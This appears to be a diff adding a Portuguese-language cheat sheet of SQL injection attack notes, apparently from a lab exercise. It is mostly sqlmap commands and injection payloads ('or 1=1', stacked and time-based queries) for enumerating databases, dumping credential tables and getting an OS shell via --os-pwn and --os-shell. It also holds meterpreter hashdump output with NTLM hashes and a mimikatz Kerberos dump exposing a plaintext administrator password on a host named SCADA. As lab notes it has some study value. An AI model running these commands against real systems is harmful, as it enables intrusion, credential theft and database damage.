@@ -1,0 +1,175 @@
+
+sqlmap -r /tmp/pacotecapturado-no-burp --threads 10 --batch --level=5 --risk=3
+
+
+- risk é perigoso, se for sigiloso usar o 1
+- level testa todos as maneiras
+- --batch é pra não ficar perguntando toda hora
+
+
+ALGUNS BIZUS DE SQL INJECTIONS
+
+
+STACKED QUERIES - Para checar stacked querries usa-se o ";" (ponto-e-virgula), stacked query é muito bom pq permite injetar shell/meterpreter
+
+TIME-BASED QUERRIES - Para checar time-based usa-se o "waitfor delay '00:00:10" ele vai esperar 10 segundos
+
+PARA PREVENIR O TRIN (SPLIT FEITO PELA APLICAÇÃO NO FINAL DA QUERRY), após o comentário dar um espaço + ponto "'1 or 1=1 -- ."
+
+admin'or 1=1; select 1 waitfor delay '00:00:10' -- .
+
+
+
+
+ARQUIVO SOAPREQUEST.TXT
+---------------------------------------------------------------------------------------------------------------------------------------
+POST /CyberCampWS/index.php HTTP/1.1
+Host: 192.168.10.106
+User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+Soapaction: urn:server/autenticacion
+Content-Length: 348
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <autenticacion xmlns="urn:server">
+      <usuario>sddsfs</usuario>
+      <password>sdfsdf</password>
+    </autenticacion>
+  </soap:Body>
+</soap:Envelope>
+---------------------------------------------------------------------------------------------------------------------------------------
+
+
+CHECANDO O BANCO DE DADOS
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 
+
+VER O DATABASE
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 --dbs
+
+VER AS TABELAS DA DATABASE WS
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 -D WS --tables
+
+PORQUE O "WS" ? 
+
+	porque os outros já eram por padrão do MS SQL SERVER 2005
+
+		master
+		model
+		msdb
+		tempdb
+		WS         <--------- ALVO
+
+VER A TABELA AUTH DO DATABSE WS
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 -D WS -T AUTH --columns
+
+DUMP DA TABELA
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 -D WS -T AUTH --columns --dump
+
++----------+---------------------------------------------------+
+| USERNAME | PASSWORD                                          |
++----------+---------------------------------------------------+
+| jesus    | bf2f749e80c970f50552e9d5f3e8434e78b88d35 (matrix) |
++----------+---------------------------------------------------+
+
+PEGANDO O PASSWORD DO MS SQL SERVER 2005
+# sqlmap -r soaprequest.txt --threads 10 --batch --password
+
+
+PEGANDO O SHELL
+# sqlmap -r soaprequest.txt --batch --level=5 --risk=3 --os-pwn
+
+meterpreter > hashdump
+
+Administrador:500:66e5d5ae82299cb6aad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+Asistente de ayuda:1000:b15e5c1ced52893c2eaa0fbf1cc11045:32da5b1a33d4b1ad6a2b98f67a1133d1:::
+Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jesus:1006:66e5d5ae82299cb6aad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+rolling:1007:f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:66d0584183db2c8ae169865183899ffa:::
+
+meterpreter > use mimikatz
+Loading extension mimikatz...success.
+meterpreter > kerberos
+
+kerberos credentials
+====================
+
+AuthID    Package    Domain           User              Password
+------    -------    ------           ----              --------
+0;997     Negotiate  NT AUTHORITY     SERVICIO LOCAL    
+0;996     Negotiate  NT AUTHORITY     Servicio de red   
+0;55702   NTLM                                          
+0;999     NTLM       WORKGROUP        SCADA-1519CEC3A$  
+0;200038  NTLM       SCADA-1519CEC3A  Administrador     matrix
+
+
+
+Para pegar o FORMULARIO NO FORMATO CERTO PARA O SQLMAP BASTA ABRIR AS FERRAMENTAS PARA DESENVOLVEDOR NA ABA NETWORK
+e ao enviar o POST vc pode selecioná-lo e com o botão direito copiar no formato CURL. O resultado será o abaixo:
+
+        'http://192.168.105.144/validacion.asp' -H 'Host: 192.168.105.144' 
+        -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4' 
+        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
+        -H 'Accept-Language: en-US,en;q=0.5' -H 'Referer: http://192.168.105.144/' 
+        -H 'Cookie: ASPSESSIONIDQSSCASRR=FDIFGFHCFIPLECEPHFILPIAJ; ASPSESSIONIDSSBTBQQS=FEDPGOHCMPOPHKEOIIBCONGP; ASPSESSIONIDSSDRAQRT=LFDDLKICEOCJMJLIBJDFODBL' 
+        -- compress -------------------------------> (ESTA OPÇÃO AS VEZES FUNCIONA, AS VEZES NÃO)
+        -H 'Connection: keep-alive' 
+        --data 'username=admin&password=12123'
+
+Não há necessidade de todos os parametros. Por fim o comando inteiro fica dessa forma:
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' -H 'Host: 192.168.105.144' / 
+         -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4' / 
+         -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' / 
+         -H 'Accept-Language: en-US,en;q=0.5' /
+         --compressed / 
+         -H 'Referer: http://192.168.105.144/' /
+         -H 'Cookie: ASPSESSIONIDQSSCASRR=FDIFGFHCFIPLECEPHFILPIAJ; ASPSESSIONIDSSBTBQQS=FEDPGOHCMPOPHKEOIIBCONGP; ASPSESSIONIDSSDRAQRT=LFDDLKICEOCJMJLIBJDFODBL' /
+         -H 'Connection: keep-alive' /
+         --data 'username=admin&password=12123' / 
+         --level=5
+         --risk=3 (Cuidado com esse parametro - Ele pode danificar o banco use com risk=1/2/3 sendo o 3 o mais alto)
+
+Com as coisas desnecessárias ficaria assim:
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data='username=admin&password=12123' --level=5
+
+
+
+Agora que o SQLMAP realizou e buscou as vulnerabilidades é hora de fazer as coisas 
+
+PEGAR OS BANCOS
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data='username=admin&password=12123' --level=5 --dbs
+
+Caso vc precise ver em qual banco vc está 
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data='username=admin&password=12123' --level=5 --dbs --current-db
+
+entrar na database HACK e checar as tabelas
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data 'username=admin&password=12123' -D hack --tables
+
+entra na database HACK e tabela USU e checa as colunas
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data 'username=admin&password=12123' --technique=US -D hack -T usu --columns
+
+REALIZA o dump dos dados
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data 'username=admin&password=12123' --technique=US -D hack -T usu --columns --dump
+
+
+
+EXTRAS 
+
+O comando abaixo apaga o que o sqlmap já guardou a respeito do banco (Flush Session), ZERA o que o SQLMAP sabia sobre o HOST ALVO
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data 'username=admin&password=12123' --level=5 --flush-session
+
+Usa UNION querries e STACK querries que já foram identificadas como Vulnerabilidade e assim aumenta a velocidade, se não foram identificadas como 
+vulnerabilidades, não há como usar.
+ $sqlmap -u 'http://192.168.105.144/validacion.asp' --data 'username=admin&password=12123' --technique=US
+
+Checa sem precisar informar o POST da página e ainda responde as perguntas do SQLMAP durante o ataque
+ $sqlmap -u http://192.168.105.144 --crawl=3 --batch --forms --level=5
+
+Se houver a vulnerabilidade, ataca e ainda traz um shell com a velocidade da técnica US
+ $sqlmap -u http://192.168.105.144 --crawl=3 --batch --forms --level5 --os-shell --technique=US
